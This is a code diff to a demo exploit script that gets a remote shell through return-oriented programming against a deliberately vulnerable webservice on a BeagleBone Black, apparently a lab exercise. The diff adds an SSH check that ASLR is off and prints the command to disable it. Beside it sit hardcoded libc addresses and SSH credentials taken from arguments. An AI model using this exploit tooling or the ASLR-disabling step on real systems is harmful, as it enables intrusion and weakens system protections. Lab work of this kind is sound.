@@ -25,12 +25,15 @@ Note on gadget validity:
 Shell appears in the BBB SSH terminal where ./rop-webservice was started.
 """
 
-import sys, os, struct, requests
+import sys, os, struct
 from urllib.parse import urlparse
 
 VENV = os.path.join(os.path.dirname(__file__), '..', 'exploit-env',
                     'lib', 'python3.12', 'site-packages')
 sys.path.insert(0, VENV)
+
+import paramiko
+import requests
 
 def parse_target(raw: str) -> str:
     """Validate and normalise the target URL using urllib.parse.
@@ -53,11 +56,36 @@ def parse_target(raw: str) -> str:
     return raw.rstrip('/')
 
 
-if len(sys.argv) != 2:
-    prog = os.path.basename(sys.argv[0])
-    sys.exit(f'Usage: {prog} <target-url>\n  e.g. {prog} http://192.168.7.2:8080')
+def check_aslr(host: str, user: str, password: str) -> None:
+    print(f'[*] Checking ASLR on {host} …')
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(host, username=user, password=password, timeout=5)
+        _, stdout, _ = client.exec_command(
+            'cat /proc/sys/kernel/randomize_va_space'
+        )
+        value = stdout.read().decode().strip()
+        client.close()
+    except Exception as e:
+        sys.exit(f'[-] SSH to {host} failed: {e}')
+    if value != '0':
+        sys.exit(
+            f'[-] ASLR is enabled on {host} (randomize_va_space={value})\n'
+            f'    Disable it with:\n'
+            f'      echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'
+        )
+    print(f'[+] ASLR disabled (randomize_va_space=0)')
 
-TARGET = parse_target(sys.argv[1])
+
+if len(sys.argv) != 4:
+    prog = os.path.basename(sys.argv[0])
+    sys.exit(f'Usage: {prog} <target-url> <ssh-user> <ssh-pass>\n'
+             f'  e.g. {prog} http://192.168.7.2:8080 embed embed')
+
+TARGET   = parse_target(sys.argv[1])
+SSH_USER = sys.argv[2]
+SSH_PASS = sys.argv[3]
 
 # Exact addresses from live process
 LIBC_BASE = 0xb6d5b000
@@ -82,14 +110,14 @@ BANNER = """
 ║  Prerequisites                                               ║
 ║                                                              ║
 ║  1. BBB connected to this machine (USB or Ethernet)          ║
-║  2. ASLR disabled on BBB:                                    ║
+║  2. ASLR disabled on BBB (script validates this):            ║
 ║       echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  ║
 ║  3. Terminal A — SSH into BBB and start the service:         ║
 ║       ssh <user>@<bbb-ip>                                    ║
 ║       cd ~/rop-vuln-webservice && ./rop-webservice           ║
 ║  4. Terminal B — run this script from the repo root:         ║
 ║       source exploit-env/bin/activate                        ║
-║       python3 demos/get_shell.py http://<bbb-ip>:8080        ║
+║       python3 demos/get_shell.py <url> <user> <pass>         ║
 ║                                                              ║
 ║  The shell appears in Terminal A (the BBB SSH session).      ║
 ╚══════════════════════════════════════════════════════════════╝
@@ -97,6 +125,7 @@ BANNER = """
 
 def main():
     print(BANNER)
+    check_aslr(urlparse(TARGET).hostname, SSH_USER, SSH_PASS)
     try:
         r = requests.get(f'{TARGET}/pi/status', timeout=3)
         print(f'[+] Service alive: {r.json()}')
